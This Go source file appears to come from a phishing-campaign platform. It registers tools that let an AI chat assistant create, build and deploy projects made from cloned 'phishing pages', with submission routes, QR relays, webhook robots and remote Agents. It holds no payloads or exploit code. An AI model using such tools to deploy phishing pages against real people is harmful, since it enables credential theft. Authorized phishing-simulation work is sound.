package chattools

import (
	"fmt"
	"strings"
	"time"

	"spearhook/config"
	"spearhook/models"
	"spearhook/platform"

	"gorm.io/gorm"
)

func init() {
	Register(newTool(
		"list_projects",
		"List projects the current user can access (id, name, status, runtime hints).",
		RiskRead,
		schema(nil, nil),
		"",
		toolListProjects,
	))
	Register(newTool(
		"get_project",
		"Get one project by id, including deployments and runtime_url when available.",
		RiskRead,
		schema(map[string]any{
			"project_id": map[string]any{"type": "integer", "description": "Project ID"},
		}, []string{"project_id"}),
		"",
		toolGetProject,
	))
	Register(newTool(
		"create_project",
		"Create a project from a page-library id and optionally bind Agent IDs and a QR relay. Runs immediately. Project name must be letters, numbers, hyphens only.",
		RiskWrite,
		schema(map[string]any{
			"name":             map[string]any{"type": "string", "description": "Project name (English letters, numbers, hyphens)"},
			"phishing_page_id": map[string]any{"type": "integer", "description": "Page library id returned by clone_page"},
			"agent_ids":        map[string]any{"type": "array", "items": map[string]any{"type": "integer"}, "description": "Agent database IDs to bind; omit to pick first online Agent"},
			"qr_relay_id":      map[string]any{"type": "integer", "description": "Optional QR relay id; resolves {{QR_RELAY_IMG}} / {{QR_RELAY_URL}} at build/start"},
			"description":      map[string]any{"type": "string"},
			"frontend_route":   map[string]any{"type": "string", "description": "Default /"},
			"run_mode":         map[string]any{"type": "string", "enum": []string{"docker", "local"}, "description": "Default docker"},
		}, []string{"name", "phishing_page_id"}),
		"",
		toolCreateProject,
	))
	Register(newTool(
		"project_action",
		"Control a project's runtime. target=local runs on the control-plane host: a Docker container for docker-mode projects (image must be built) or local Flask for local-mode projects; no Agent is needed. target=agent queues remote Agent deployments. If target is omitted, local is chosen when the project has no active deployments and no online Agents.",
		RiskWrite,
		schema(map[string]any{
			"project_id": map[string]any{"type": "integer", "description": "Project ID"},
			"action":     map[string]any{"type": "string", "enum": []string{"deploy", "redeploy", "start", "restart", "stop"}},
			"target":     map[string]any{"type": "string", "enum": []string{"local", "agent"}, "description": "local = this host (Docker/local Flask); agent = remote Agent deployment"},
		}, []string{"project_id", "action"}),
		"",
		toolProjectAction,
	))
	Register(newTool(
		"update_project",
		"Update an existing project. Only provided fields change: name, description, run_mode (docker/local), routes, login_url, port, use_https, qr_relay_id, phishing_page_id, agent_ids, robot_ids.",
		RiskWrite,
		schema(map[string]any{
			"project_id":       map[string]any{"type": "integer", "description": "Project ID"},
			"name":             map[string]any{"type": "string"},
			"description":      map[string]any{"type": "string"},
			"run_mode":         map[string]any{"type": "string", "enum": []string{"docker", "local"}},
			"frontend_route":   map[string]any{"type": "string"},
			"container_route":  map[string]any{"type": "string"},
			"login_url":        map[string]any{"type": "string"},
			"port":             map[string]any{"type": "integer"},
			"use_https":        map[string]any{"type": "boolean"},
			"qr_relay_id":      map[string]any{"type": "integer"},
			"phishing_page_id": map[string]any{"type": "integer", "description": "Replace project HTML from this page-library id"},
			"agent_ids":        map[string]any{"type": "array", "items": map[string]any{"type": "integer"}, "description": "Replace bound Agents (docker only); [] unbinds all"},
			"robot_ids":        map[string]any{"type": "array", "items": map[string]any{"type": "integer"}, "description": "Replace bound webhook robots; [] unbinds all"},
		}, []string{"project_id"}),
		"",
		toolUpdateProject,
	))
	Register(newTool(
		"build_project",
		"Build the Docker image for a docker-mode project. Local Flask projects do not need this. Poll get_project or get_project_logs for build status.",
		RiskWrite,
		schema(map[string]any{
			"project_id": map[string]any{"type": "integer", "description": "Project ID"},
		}, []string{"project_id"}),
		"",
		toolBuildProject,
	))
	Register(newTool(
		"get_project_logs",
		"Get project runtime diagnostics: build/container status, container log tail, and recent deployment logs.",
		RiskRead,
		schema(map[string]any{
			"project_id": map[string]any{"type": "integer", "description": "Project ID"},
			"limit":      map[string]any{"type": "integer", "description": "Max deployment log rows (default 100, max 500)"},
		}, []string{"project_id"}),
		"",
		toolGetProjectLogs,
	))
}

func toolListProjects(ec ExecContext, _ map[string]any) Result {
	db := config.GetDB()
	var projects []models.Project
	q := platform.ScopeByOwner(db.Model(&models.Project{}), ec.User).Preload("Deployments").Order("id DESC")
	if err := q.Find(&projects).Error; err != nil {
		return Result{OK: false, Error: "failed to list projects"}
	}
	out := make([]map[string]any, 0, len(projects))
	for _, p := range projects {
		out = append(out, projectSummary(p))
	}
	return Result{OK: true, Summary: fmt.Sprintf("%d projects", len(out)), Result: out}
}

func projectSummary(p models.Project) map[string]any {
	deps := make([]map[string]any, 0, len(p.Deployments))
	for _, d := range p.Deployments {
		if d.DesiredStatus == models.DeploymentStatusRemoved {
			continue
		}
		deps = append(deps, map[string]any{
			"id":           d.ID,
			"agent_id":     d.AgentID,
			"actual":       d.ActualStatus,
			"desired":      d.DesiredStatus,
			"runtime_url":  d.RuntimeURL,
			"runtime_port": d.RuntimePort,
		})
	}
	return map[string]any{
		"id":               p.ID,
		"name":             p.Name,
		"run_mode":         p.RunMode,
		"container_status": p.ContainerStatus,
		"build_status":     p.BuildStatus,
		"port":             p.Port,
		"frontend_route":   p.FrontendRoute,
		"deployments":      deps,
	}
}

func toolGetProject(ec ExecContext, args map[string]any) Result {
	id, ok := jsonInt(args["project_id"])
	if !ok || id <= 0 {
		return Result{OK: false, Error: "project_id is required"}
	}
	db := config.GetDB()
	var project models.Project
	if err := platform.ScopeByOwner(db, ec.User).Preload("Deployments.Agent").Preload("Robots").First(&project, uint(id)).Error; err != nil {
		return Result{OK: false, Error: "project not found"}
	}
	detail := projectSummary(project)
	detail["login_url"] = project.LoginURL
	detail["created_at"] = project.CreatedAt
	robots := make([]map[string]any, 0, len(project.Robots))
	for _, r := range project.Robots {
		robots = append(robots, map[string]any{
			"id":         r.ID,
			"name":       r.Name,
			"robot_type": r.RobotType,
			"status":     r.Status,
		})
	}
	detail["robots"] = robots
	links := []Link{{Label: "打开项目", Href: fmt.Sprintf("/projects/%d", project.ID)}}
	for _, d := range project.Deployments {
		if strings.TrimSpace(d.RuntimeURL) != "" {
			links = append(links, Link{Label: "落地页", Href: d.RuntimeURL})
			break
		}
	}
	return Result{
		OK:      true,
		Summary: fmt.Sprintf("project #%d %s", project.ID, project.Name),
		Result:  detail,
		Links:   links,
	}
}

func toolCreateProject(ec ExecContext, args map[string]any) Result {
	name := jsonString(args["name"])
	if err := platform.ValidateProjectName(name); err != nil {
		return Result{OK: false, Error: err.Error()}
	}
	pageID, ok := jsonInt(args["phishing_page_id"])
	if !ok || pageID <= 0 {
		return Result{OK: false, Error: "phishing_page_id is required"}
	}
	desc := jsonString(args["description"])
	frontendRoute := jsonString(args["frontend_route"])
	runModeStr := jsonString(args["run_mode"])

	db := config.GetDB()
	var page models.PhishingPage
	if err := platform.ScopeByOwner(db, ec.User).First(&page, uint(pageID)).Error; err != nil {
		return Result{OK: false, Error: "phishing page not found"}
	}
	filePath, err := platform.WritePreparedHTMLFile(page.Html)
	if err != nil {
		return Result{OK: false, Error: "failed to prepare HTML: " + err.Error()}
	}

	runMode, err := platform.ParseProjectRunMode(runModeStr)
	if err != nil {
		return Result{OK: false, Error: err.Error()}
	}

	var qrRelayID *uint
	if relayID := jsonUintPtr(args["qr_relay_id"]); relayID != nil {
		var relay models.QrRelay
		if err := platform.ScopeByOwner(db, ec.User).First(&relay, *relayID).Error; err != nil {
			return Result{OK: false, Error: "QR relay not found"}
		}
		id := relay.ID
		qrRelayID = &id
	}

	agentIDs := jsonUintSlice(args["agent_ids"])
	if len(agentIDs) == 0 {
		var agents []models.Agent
		_ = db.Order("last_seen_at DESC, id DESC").Find(&agents).Error
		now := time.Now()
		for _, agent := range agents {
			if platform.CurrentAgentStatus(agent, now) == models.AgentStatusOnline {
				agentIDs = []uint{agent.ID}
				break
			}
		}
	}

	project := models.Project{
		Name:               name,
		Description:        desc,
		RunMode:            platform.NormalizedProjectRunMode(runMode),
		FrontendRoute:      platform.NormalizeRoutePath(frontendRoute, "/"),
		ContainerRoute:     platform.NormalizeRoutePath("", "/api/submit"),
		HtmlFilePath:       filePath,
		Port:               8080,
		QrRelayID:          qrRelayID,
		ContainerStatus:    models.ContainerStatusStopped,
		BuildStatus:        models.BuildStatusPending,
		DeploymentRevision: 1,
		CreatedBy:          ec.User.ID,
	}
	platform.ApplyPhishingPageDefaults(&project, &page)

	if err := db.Transaction(func(tx *gorm.DB) error {
		if err := tx.Create(&project).Error; err != nil {
			return err
		}
		return platform.SyncProjectDeployments(tx, &project, agentIDs)
	}); err != nil {
		return Result{OK: false, Error: "Failed to create project: " + err.Error()}
	}

	_ = db.Preload("Deployments.Agent").First(&project, project.ID)

	return Result{
		OK:      true,
		Summary: fmt.Sprintf("created project #%d %s (agents=%v)", project.ID, project.Name, agentIDs),
		Result: map[string]any{
			"id":           project.ID,
			"name":         project.Name,
			"run_mode":     project.RunMode,
			"agent_ids":    agentIDs,
			"qr_relay_id":  project.QrRelayID,
			"deployments":  project.Deployments,
			"project_path": fmt.Sprintf("/projects/%d", project.ID),
		},
		Links: []Link{{Label: "打开项目", Href: fmt.Sprintf("/projects/%d", project.ID)}},
	}
}

func toolProjectAction(ec ExecContext, args map[string]any) Result {
	projectID := jsonUintPtr(args["project_id"])
	if projectID == nil {
		return Result{OK: false, Error: "project_id is required"}
	}
	action := strings.ToLower(jsonString(args["action"]))
	db := config.GetDB()
	var project models.Project
	if err := platform.ScopeByOwner(db, ec.User).Preload("Robots").First(&project, *projectID).Error; err != nil {
		return Result{OK: false, Error: "project not found"}
	}
	if platform.NormalizedProjectRunMode(project.RunMode) == models.ProjectRunModeLocal {
		return localProjectAction(&project, action)
	}

	target := strings.ToLower(jsonString(args["target"]))
	if target != "local" && target != "agent" {
		target = defaultProjectTarget(db, &project)
	}
	if target == "local" {
		return localDockerAction(&project, action)
	}
	return dockerProjectAction(db, &project, action)
}

// defaultProjectTarget avoids sending work to Agents when none can receive it.
func defaultProjectTarget(db *gorm.DB, project *models.Project) string {
	var deployments int64
	db.Model(&models.ProjectDeployment{}).
		Where("project_id = ? AND desired_status <> ?", project.ID, models.DeploymentStatusRemoved).
		Count(&deployments)
	if deployments > 0 {
		return "agent"
	}
	var agents []models.Agent
	if err := db.Find(&agents).Error; err != nil {
		return "local"
	}
	now := time.Now()
	for _, agent := range agents {
		if platform.CurrentAgentStatus(agent, now) == models.AgentStatusOnline {
			return "agent"
		}
	}
	return "local"
}

// localDockerAction controls the project's container on the control-plane host.
func localDockerAction(project *models.Project, action string) Result {
	link := Link{Label: "打开项目", Href: fmt.Sprintf("/projects/%d", project.ID)}
	switch action {
	case "deploy", "redeploy", "start", "restart":
		if action == "restart" || action == "redeploy" {
			if project.ContainerStatus == models.ContainerStatusRunning {
				_ = platform.StopLocalDockerProject(project)
			}
		}
		result, err := platform.StartLocalDockerProject(project)
		if err != nil {
			return Result{OK: false, Error: err.Error(), Links: []Link{link}}
		}
		summary := fmt.Sprintf("started local Docker container for project #%d", project.ID)
		if result.AlreadyRunning {
			summary = fmt.Sprintf("local Docker container for project #%d is already running", project.ID)
		}
		return Result{
			OK:      true,
			Summary: summary,
			Result: map[string]any{
				"project_id":      project.ID,
				"target":          "local",
				"runtime":         "docker",
				"container_id":    result.ContainerID,
				"url":             result.URL,
				"already_running": result.AlreadyRunning,
			},
			Links: []Link{link},
		}
	case "stop":
		if project.ContainerStatus != models.ContainerStatusRunning {
			return Result{
				OK:      true,
				Summary: fmt.Sprintf("local Docker container for project #%d is already stopped", project.ID),
				Result:  map[string]any{"project_id": project.ID, "target": "local", "runtime": "docker", "already_stopped": true},
				Links:   []Link{link},
			}
		}
		if err := platform.StopLocalDockerProject(project); err != nil {
			return Result{OK: false, Error: err.Error(), Links: []Link{link}}
		}
		return Result{
			OK:      true,
			Summary: fmt.Sprintf("stopped local Docker container for project #%d", project.ID),
			Result:  map[string]any{"project_id": project.ID, "target": "local", "runtime": "docker"},
			Links:   []Link{link},
		}
	default:
		return Result{OK: false, Error: "unsupported action: " + action}
	}
}

// localProjectAction controls a local Flask project; no Agent is involved.
func localProjectAction(project *models.Project, action string) Result {
	link := Link{Label: "打开项目", Href: fmt.Sprintf("/projects/%d", project.ID)}
	switch action {
	case "deploy", "redeploy", "start", "restart":
		if action == "restart" || action == "redeploy" {
			if pid, ok := platform.ParseLocalContainerPID(project.ContainerID); ok {
				_ = platform.StopLocalProject(project, pid)
			}
		}
		result, err := platform.StartLocalProject(project, platform.ResolvePublicBaseURL("", ""))
		if err != nil {
			return Result{OK: false, Error: err.Error(), Links: []Link{link}}
		}
		summary := fmt.Sprintf("started local project #%d", project.ID)
		if result.AlreadyRunning {
			summary = fmt.Sprintf("local project #%d is already running", project.ID)
		}
		return Result{
			OK:      true,
			Summary: summary,
			Result: map[string]any{
				"project_id":      project.ID,
				"run_mode":        "local",
				"pid":             result.PID,
				"url":             result.URL,
				"already_running": result.AlreadyRunning,
			},
			Links: []Link{link},
		}
	case "stop":
		pid, ok := platform.ParseLocalContainerPID(project.ContainerID)
		if !ok {
			if project.ContainerStatus != models.ContainerStatusRunning {
				return Result{
					OK:      true,
					Summary: fmt.Sprintf("local project #%d is already stopped", project.ID),
					Result:  map[string]any{"project_id": project.ID, "run_mode": "local", "already_stopped": true},
					Links:   []Link{link},
				}
			}
			return Result{OK: false, Error: "project is not running as a local Flask process", Links: []Link{link}}
		}
		if err := platform.StopLocalProject(project, pid); err != nil {
			return Result{OK: false, Error: err.Error(), Links: []Link{link}}
		}
		return Result{
			OK:      true,
			Summary: fmt.Sprintf("stopped local project #%d", project.ID),
			Result:  map[string]any{"project_id": project.ID, "run_mode": "local", "pid": pid},
			Links:   []Link{link},
		}
	default:
		return Result{OK: false, Error: "unsupported action: " + action}
	}
}

// dockerProjectAction controls Agent deployments, auto-binding the first online
// Agent when the project has no deployments yet.
func dockerProjectAction(db *gorm.DB, project *models.Project, action string) Result {
	link := Link{Label: "打开项目", Href: fmt.Sprintf("/projects/%d", project.ID)}
	taskType := ""
	switch action {
	case "deploy", "redeploy", "start", "restart":
		taskType = "project.deploy"
	case "stop":
		taskType = "project.stop"
	default:
		return Result{OK: false, Error: "unsupported action: " + action}
	}

	var deployments []models.ProjectDeployment
	if err := db.Where("project_id = ? AND desired_status <> ?", project.ID, models.DeploymentStatusRemoved).
		Order("id ASC").Find(&deployments).Error; err != nil {
		return Result{OK: false, Error: "failed to load deployments"}
	}

	if len(deployments) == 0 {
		if taskType != "project.deploy" {
			return Result{OK: false, Error: "project has no active deployments", Links: []Link{link}}
		}
		var agents []models.Agent
		_ = db.Order("last_seen_at DESC, id DESC").Find(&agents).Error
		now := time.Now()
		var onlineID uint
		for _, agent := range agents {
			if platform.CurrentAgentStatus(agent, now) == models.AgentStatusOnline {
				onlineID = agent.ID
				break
			}
		}
		if onlineID == 0 {
			return Result{
				OK:    false,
				Error: "project has no deployments and no online Agents; register an Agent, or create the project in local mode",
				Links: []Link{link, {Label: "Agent 管理", Href: "/agents"}},
			}
		}
		if project.DeploymentRevision == 0 {
			project.DeploymentRevision = 1
		}
		if err := db.Transaction(func(tx *gorm.DB) error {
			return platform.SyncProjectDeployments(tx, project, []uint{onlineID})
		}); err != nil {
			return Result{OK: false, Error: "failed to bind online Agent: " + err.Error(), Links: []Link{link}}
		}
		return Result{
			OK:      true,
			Summary: fmt.Sprintf("bound agent #%d and queued deploy for project #%d", onlineID, project.ID),
			Result: map[string]any{
				"project_id": project.ID,
				"agent_id":   onlineID,
				"action":     action,
				"auto_bound": true,
			},
			Links: []Link{link},
		}
	}

	if err := db.Transaction(func(tx *gorm.DB) error {
		for i := range deployments {
			d := deployments[i]
			if taskType == "project.deploy" {
				d.DesiredStatus = models.DeploymentStatusRunning
				d.ActualStatus = models.DeploymentStatusPending
				d.DesiredRevision = project.DeploymentRevision
			} else {
				d.DesiredStatus = models.DeploymentStatusStopped
			}
			if err := tx.Save(&d).Error; err != nil {
				return err
			}
			if err := platform.EnqueueAgentTask(tx, d, taskType); err != nil {
				return err
			}
		}
		return nil
	}); err != nil {
		return Result{OK: false, Error: "failed to queue deployment action: " + err.Error()}
	}

	return Result{
		OK:      true,
		Summary: fmt.Sprintf("queued %s for %d deployment(s) of project #%d", action, len(deployments), project.ID),
		Result: map[string]any{
			"project_id":  project.ID,
			"action":      action,
			"deployments": len(deployments),
		},
		Links: []Link{link},
	}
}

func toolUpdateProject(ec ExecContext, args map[string]any) Result {
	projectID := jsonUintPtr(args["project_id"])
	if projectID == nil {
		return Result{OK: false, Error: "project_id is required"}
	}
	db := config.GetDB()
	var project models.Project
	if err := platform.ScopeByOwner(db, ec.User).Preload("Robots").First(&project, *projectID).Error; err != nil {
		return Result{OK: false, Error: "project not found"}
	}
	link := Link{Label: "打开项目", Href: fmt.Sprintf("/projects/%d", project.ID)}
	oldMode := platform.NormalizedProjectRunMode(project.RunMode)
	changed := false

	if v, ok := args["name"]; ok {
		name := jsonString(v)
		if err := platform.ValidateProjectName(name); err != nil {
			return Result{OK: false, Error: err.Error(), Links: []Link{link}}
		}
		if name != project.Name {
			project.Name = name
			changed = true
		}
	}
	if v, ok := args["description"]; ok {
		project.Description = jsonString(v)
		changed = true
	}
	if v, ok := args["frontend_route"]; ok {
		project.FrontendRoute = platform.NormalizeRoutePath(jsonString(v), "/")
		changed = true
	}
	if v, ok := args["container_route"]; ok {
		project.ContainerRoute = platform.NormalizeRoutePath(jsonString(v), "/api/submit")
		changed = true
	}
	if v, ok := args["login_url"]; ok {
		project.LoginURL = jsonString(v)
		changed = true
	}
	if v, ok := args["port"]; ok {
		port, ok := jsonInt(v)
		if !ok || port <= 0 || port > 65535 {
			return Result{OK: false, Error: "port must be between 1 and 65535", Links: []Link{link}}
		}
		if err := platform.ValidatePublicPort(uint(port)); err != nil {
			return Result{OK: false, Error: err.Error(), Links: []Link{link}}
		}
		project.Port = uint(port)
		changed = true
	}
	if v, ok := args["run_mode"]; ok {
		mode, err := platform.ParseProjectRunMode(jsonString(v))
		if err != nil {
			return Result{OK: false, Error: err.Error(), Links: []Link{link}}
		}
		if mode != oldMode {
			if project.ContainerStatus == models.ContainerStatusRunning {
				return Result{OK: false, Error: "stop the running service before changing run mode", Links: []Link{link}}
			}
			project.RunMode = mode
			project.BuildStatus = models.BuildStatusPending
			project.TaskID = ""
			project.DockerImage = ""
			project.ContainerCode = ""
			project.ContainerLog = "run mode changed; rebuild required"
			project.ContainerID = ""
			project.ContainerStatus = models.ContainerStatusStopped
			changed = true
		}
	}
	if v, ok := args["use_https"]; ok {
		use := jsonBool(v, false)
		if use && !platform.HasProjectSSLCert(project) {
			return Result{OK: false, Error: "HTTPS requires certificate/key files uploaded from the project page", Links: []Link{link}}
		}
		project.UseHTTPS = use
		changed = true
	}
	if v, ok := args["qr_relay_id"]; ok {
		n, _ := jsonInt(v)
		if n <= 0 {
			project.QrRelayID = nil
		} else {
			var relay models.QrRelay
			if err := platform.ScopeByOwner(db, ec.User).First(&relay, uint(n)).Error; err != nil {
				return Result{OK: false, Error: "QR relay not found", Links: []Link{link}}
			}
			id := relay.ID
			project.QrRelayID = &id
		}
		changed = true
	}
	if v, ok := args["phishing_page_id"]; ok {
		pageID := jsonUintPtr(v)
		if pageID == nil {
			return Result{OK: false, Error: "phishing_page_id must be positive", Links: []Link{link}}
		}
		var page models.PhishingPage
		if err := platform.ScopeByOwner(db, ec.User).First(&page, *pageID).Error; err != nil {
			return Result{OK: false, Error: "page not found", Links: []Link{link}}
		}
		filePath, err := platform.WritePreparedHTMLFile(page.Html)
		if err != nil {
			return Result{OK: false, Error: "failed to prepare HTML: " + err.Error(), Links: []Link{link}}
		}
		project.HtmlFilePath = filePath
		platform.ApplyPhishingPageDefaults(&project, &page)
		changed = true
	}

	var robots []models.Robot
	robotsProvided := false
	if v, ok := args["robot_ids"]; ok {
		robotsProvided = true
		ids := jsonUintSlice(v)
		if len(ids) > 0 {
			seen := make(map[uint]struct{}, len(ids))
			for _, id := range ids {
				seen[id] = struct{}{}
			}
			if err := platform.ScopeByOwner(db.Model(&models.Robot{}), ec.User).
				Where("id IN ?", ids).Find(&robots).Error; err != nil {
				return Result{OK: false, Error: "failed to load robots", Links: []Link{link}}
			}
			if len(robots) != len(seen) {
				return Result{OK: false, Error: "one or more robots are not accessible", Links: []Link{link}}
			}
		} else {
			robots = []models.Robot{}
		}
		changed = true
	}

	agentsProvided := false
	var agentIDs []uint
	if v, ok := args["agent_ids"]; ok {
		agentsProvided = true
		agentIDs = jsonUintSlice(v)
		changed = true
	}

	newMode := platform.NormalizedProjectRunMode(project.RunMode)
	if newMode == models.ProjectRunModeLocal && len(agentIDs) > 0 {
		return Result{OK: false, Error: "local projects cannot bind Agents; switch run_mode to docker first", Links: []Link{link}}
	}
	if !changed {
		return Result{OK: false, Error: "no updatable fields provided", Links: []Link{link}}
	}
	if err := platform.ValidateProjectName(project.Name); err != nil {
		return Result{OK: false, Error: err.Error(), Links: []Link{link}}
	}

	project.DeploymentRevision++
	if project.DeploymentRevision < 1 {
		project.DeploymentRevision = 1
	}

	if err := db.Transaction(func(tx *gorm.DB) error {
		if err := tx.Save(&project).Error; err != nil {
			return err
		}
		if robotsProvided {
			if err := tx.Model(&project).Association("Robots").Replace(robots); err != nil {
				return err
			}
		}
		switch {
		case newMode == models.ProjectRunModeLocal:
			return platform.SyncProjectDeployments(tx, &project, nil)
		case agentsProvided:
			return platform.SyncProjectDeployments(tx, &project, agentIDs)
		case oldMode != newMode:
			return platform.SyncProjectDeployments(tx, &project, nil)
		default:
			return nil
		}
	}); err != nil {
		return Result{OK: false, Error: "failed to update project: " + err.Error(), Links: []Link{link}}
	}

	_ = db.Preload("Robots").Preload("Deployments.Agent").First(&project, project.ID)
	detail := projectSummary(project)
	detail["login_url"] = project.LoginURL
	detail["run_mode"] = project.RunMode
	detail["html_file_path"] = project.HtmlFilePath
	return Result{
		OK:      true,
		Summary: fmt.Sprintf("updated project #%d %s", project.ID, project.Name),
		Result:  detail,
		Links:   []Link{link},
	}
}

func toolBuildProject(ec ExecContext, args map[string]any) Result {
	projectID := jsonUintPtr(args["project_id"])
	if projectID == nil {
		return Result{OK: false, Error: "project_id is required"}
	}
	db := config.GetDB()
	var project models.Project
	if err := platform.ScopeByOwner(db, ec.User).First(&project, *projectID).Error; err != nil {
		return Result{OK: false, Error: "project not found"}
	}
	link := Link{Label: "打开项目", Href: fmt.Sprintf("/projects/%d", project.ID)}
	if err := platform.StartDockerBuild(&project); err != nil {
		return Result{OK: false, Error: err.Error(), Links: []Link{link}}
	}
	return Result{
		OK:      true,
		Summary: fmt.Sprintf("Docker build started for project #%d", project.ID),
		Result: map[string]any{
			"project_id":   project.ID,
			"task_id":      project.TaskID,
			"build_status": project.BuildStatus,
		},
		Links: []Link{link},
	}
}

func toolGetProjectLogs(ec ExecContext, args map[string]any) Result {
	projectID := jsonUintPtr(args["project_id"])
	if projectID == nil {
		return Result{OK: false, Error: "project_id is required"}
	}
	limit := 100
	if n, ok := jsonInt(args["limit"]); ok && n > 0 {
		limit = int(n)
	}
	if limit > 500 {
		limit = 500
	}
	db := config.GetDB()
	var project models.Project
	if err := platform.ScopeByOwner(db, ec.User).First(&project, *projectID).Error; err != nil {
		return Result{OK: false, Error: "project not found"}
	}
	var rows []models.ProjectLog
	if err := db.Where("project_id = ?", project.ID).
		Order("logged_at DESC, id DESC").Limit(limit).Find(&rows).Error; err != nil {
		return Result{OK: false, Error: "failed to load project logs"}
	}
	logs := make([]map[string]any, 0, len(rows))
	for _, row := range rows {
		logs = append(logs, map[string]any{
			"agent_id":      row.AgentID,
			"deployment_id": row.DeploymentID,
			"stream":        row.Stream,
			"level":         row.Level,
			"message":       truncateRunes(row.Message, 2000),
			"logged_at":     row.LoggedAt,
		})
	}
	return Result{
		OK: true,
		Summary: fmt.Sprintf("project #%d: build=%s container=%s (%d logs)",
			project.ID, project.BuildStatus, project.ContainerStatus, len(logs)),
		Result: map[string]any{
			"project_id":       project.ID,
			"run_mode":         project.RunMode,
			"build_status":     project.BuildStatus,
			"container_status": project.ContainerStatus,
			"docker_image":     project.DockerImage,
			"container_id":     project.ContainerID,
			"container_log":    truncateRunes(project.ContainerLog, 8000),
			"logs":             logs,
		},
		Links: []Link{{Label: "打开项目", Href: fmt.Sprintf("/projects/%d", project.ID)}},
	}
}
